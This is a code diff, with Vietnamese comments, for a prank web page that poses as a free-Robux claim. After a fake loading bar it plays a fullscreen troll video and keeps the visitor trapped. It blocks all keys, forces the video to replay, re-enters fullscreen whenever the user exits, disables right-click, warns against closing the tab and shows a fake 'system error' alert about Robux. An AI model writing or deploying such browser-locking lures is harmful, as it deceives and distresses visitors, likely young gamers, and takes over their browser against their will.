@@ -55,7 +55,6 @@
         }
         #status-text { margin-top: 10px; color: #888; font-size: 14px; }
 
-        /* VIDEO OVERLAY */
         #trollOverlay {
             display: none;
             position: fixed;
@@ -88,10 +87,8 @@
         </div>
     </div>
 
-    <!-- Dùng overlay riêng thay vì để video trực tiếp trên body -->
     <div id="trollOverlay">
         <video id="trollVideo"
-            src="troll.mp4"
             loop
             playsinline
             disablePictureInPicture
@@ -107,7 +104,13 @@
     const body     = document.getElementById('mainBody');
     const statusTx = document.getElementById('status-text');
 
-    // Các message giả cho loading bar
+    // ─── FIX CACHE ────────────────────────────────────────────────────────────
+    // Thêm timestamp vào src → mỗi lần load trang trình duyệt luôn tải file mới
+    // Kể cả khi bạn xoá troll.mp4 cũ và upload file mới cùng tên
+    video.src = "troll.mp4?v=" + Date.now();
+    video.load(); // Bắt buộc gọi load() sau khi set src bằng JS
+
+    // ─── LOADING MESSAGES ─────────────────────────────────────────────────────
     const loadMessages = [
         "Đang kết nối server...",
         "Xác minh tài khoản...",
@@ -116,13 +119,12 @@
         "Hoàn tất!"
     ];
 
-    // ─── KIỂM TRA VIDEO SẴN SÀNG TRƯỚC ───────────────────────────────────────
-    // Tránh lỗi NotSupportedError bằng cách chỉ play khi readyState đủ
+    // ─── SAFE PLAY ────────────────────────────────────────────────────────────
+    // Tránh NotSupportedError: chỉ play khi video đã load đủ dữ liệu
     function safePlay() {
-        if (video.readyState >= 2) { // HAVE_CURRENT_DATA trở lên
-            video.play().catch(() => {}); // .catch để tránh Uncaught Promise
+        if (video.readyState >= 2) {
+            video.play().catch(() => {});
         } else {
-            // Chờ video load đủ rồi mới play
             video.addEventListener('canplay', () => {
                 video.play().catch(() => {});
             }, { once: true });
@@ -133,8 +135,6 @@
     function startTrap() {
         document.getElementById('claimBtn').style.display = 'none';
         document.getElementById('loading-section').style.display = 'block';
-
-        // Fullscreen ngay từ đầu (cần gesture của người dùng → onclick là đủ)
         requestFS();
 
         let width = 0;
@@ -144,7 +144,6 @@
             if (width > 100) width = 100;
             bar.style.width = width + "%";
 
-            // Cập nhật message theo tiến trình
             const newIdx = Math.min(Math.floor(width / 25), loadMessages.length - 1);
             if (newIdx !== msgIdx) {
                 msgIdx = newIdx;
@@ -154,47 +153,43 @@
             if (width >= 100) {
                 clearInterval(loadInterval);
                 statusTx.textContent = loadMessages[loadMessages.length - 1];
-                setTimeout(launchTroll, 400); // Delay nhỏ cho UX
+                setTimeout(launchTroll, 400);
             }
         }, 80);
     }
 
-    // ─── FULLSCREEN HELPER ────────────────────────────────────────────────────
+    // ─── FULLSCREEN ───────────────────────────────────────────────────────────
     function requestFS() {
         const el = document.documentElement;
         const fn = el.requestFullscreen || el.webkitRequestFullscreen || el.mozRequestFullScreen;
         if (fn) fn.call(el).catch(() => {});
     }
 
-    // ─── PHÁT VIDEO TROLL ─────────────────────────────────────────────────────
+    // ─── LAUNCH TROLL ─────────────────────────────────────────────────────────
     function launchTroll() {
         uiBox.style.display = "none";
         overlay.style.display = "block";
         body.classList.add('no-cursor');
 
-        safePlay(); // ← Đây là fix chính, không gọi play() thẳng
+        safePlay();
 
-        // ── CHỐNG THOÁT ──────────────────────────────────────────────────────
+        // Chặn tất cả phím
+        window.addEventListener('keydown',  blockKey, true);
+        window.addEventListener('keyup',    blockKey, true);
+        window.addEventListener('keypress', blockKey, true);
 
-        // 1. Chặn TẤT CẢ phím (capture phase)
-        window.addEventListener('keydown', blockKey, true);
-        window.addEventListener('keyup',   blockKey, true);
-        window.addEventListener('keypress',blockKey, true);
-
-        // 2. Chống pause — chỉ gắn SAU khi video đã ready để tránh loop lỗi
+        // Chống pause
         video.addEventListener('pause', () => safePlay());
-
-        // 3. Backup interval — chỉ gọi safePlay, không gọi play() trực tiếp
         setInterval(() => { if (video.paused) safePlay(); }, 500);
 
-        // 4. Tự fullscreen lại nếu bị thoát
+        // Tự fullscreen lại nếu bị thoát
         document.addEventListener('fullscreenchange', onFSChange);
         document.addEventListener('webkitfullscreenchange', onFSChange);
 
-        // 5. Chặn chuột phải
+        // Chặn chuột phải
         document.addEventListener('contextmenu', e => e.preventDefault());
 
-        // 6. Chặn đóng tab
+        // Chặn đóng tab
         window.onbeforeunload = () => "Dữ liệu đang được tải, bạn có chắc muốn hủy bỏ?";
     }
 
@@ -205,9 +200,8 @@
     }
 
     function onFSChange() {
-        const isFullscreen = !!(document.fullscreenElement || document.webkitFullscreenElement);
-        if (!isFullscreen && overlay.style.display === "block") {
-            // Alert buộc người dùng nhấn OK trước khi xin lại FS
+        const isFS = !!(document.fullscreenElement || document.webkitFullscreenElement);
+        if (!isFS && overlay.style.display === "block") {
             setTimeout(() => {
                 alert("❌ LỖI HỆ THỐNG: Vui lòng nhấn OK để tiếp tục nạp Robux!");
                 requestFS();
